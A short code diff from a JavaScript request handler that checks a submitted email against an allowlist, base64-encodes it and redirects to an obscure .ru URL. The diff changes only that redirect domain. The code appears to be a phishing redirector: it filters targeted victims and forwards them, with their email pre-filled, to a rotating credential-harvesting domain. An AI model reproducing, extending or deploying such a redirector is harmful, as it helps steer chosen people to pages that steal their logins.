@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://v6.rumpelfrudg.ru/Zb8zIb/#D";
+      const baseURL = "https://sf.echospheure.ru/zeEEbl5y/#X";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
